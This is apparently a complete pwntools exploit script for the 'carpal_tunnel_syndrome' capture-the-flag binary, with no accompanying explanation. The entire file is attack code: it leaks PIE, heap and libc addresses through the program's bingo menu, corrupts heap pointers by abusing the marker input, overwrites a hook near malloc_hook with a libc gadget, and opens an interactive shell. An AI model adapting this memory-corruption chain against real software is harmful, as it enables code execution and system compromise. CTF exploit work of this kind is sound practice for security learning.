from pwn import *
r = process('./carpal_tunnel_syndrome')
#r = remote('pwn.2021.chall.actf.co', 21840)
def mark(x, y):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(x)+' '+str(y))
def view(x, y):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(x)+' '+str(y))
def reset(idx, rc):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', rc)
def check_spec(idx, rc):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', rc)
def check_bingos(x='n'):
    r.sendlineafter(':', '5')
    r.sendlineafter('?', x)
def change_marker(x):
    r.sendlineafter(':', '6')
    r.sendafter(':', x)
def mega_reset():
    for i in range(0, 5):
        reset(i, 'r')
        reset(i, 'c')
def pwn():
    r.send('A'*8)
    for i in range(0, 5):
        for j in range(0, 1):
            mark(i, j)
    check_bingos('y')
    sleep(1)
    r.sendlineafter(':', '24')
    
    r.send('A'*0x18)
    r.recvuntil('congratulations, AAAAAAAAAAAAAAAAAAAAAAAA')
    pie = u64(r.recvline()[:-2].ljust(8, b'\x00'))+8332
    log.success('Pie @ '+hex(pie))    
    mega_reset()

    for i in range(0, 5):
        for j in range(0, 1):
            mark(i, j)
    check_bingos('y')
    
    r.sendlineafter(':', '24')
    r.sendafter(':', 'A'*1)
    r.recvuntil('congratulations, A')
    heap = u64(r.recvline()[:-2].ljust(8, b'\x00'))<<8
    log.success('Heap @ '+hex(heap))
    mega_reset()
      
    for i in range(0, 1):
        for j in range(0, 5):
            mark(i, j)
    check_bingos('y')

    r.sendlineafter(':', str(0x27))

    r.sendlineafter(':', b'B'*0x18+p64(pie))
    view(0, 4)
    r.recvuntil('(0, 4): ')
    libc = u64(r.recvline().rstrip().ljust(8, b'\x00'))
    log.success('Libc @ '+hex(libc))
    malloc_hook = libc+5136

    mega_reset()
    change_marker(p64(heap+5040))
    mark(4, 3)
    change_marker(p64(libc-2864))
    mark(4, 2)
    
    
    change_marker(p64(pie+0x48)+p64(heap+0x1390))
    for i in range(0, 5):
        for j in range(3, 4):
            mark(i, j)
    check_bingos('y')
    r.sendlineafter(':', str(0))
    
    for i in range(0, 5):
        for j in range(1, 2):
            mark(i, j)
    
    check_bingos('y')
    r.sendlineafter(':', '0')
    mark(0, 1)
    reset(0, 'r')
    

    change_marker('A'*8+'\x00')
    for i in range(0, 5):
        mark(i, 0)
    check_bingos()
    
    r.sendlineafter(':', str(0x27))
    r.sendlineafter(':', p64(libc-0x105a1f))    
    reset(2, 'r')
    r.interactive()
    
pwn()
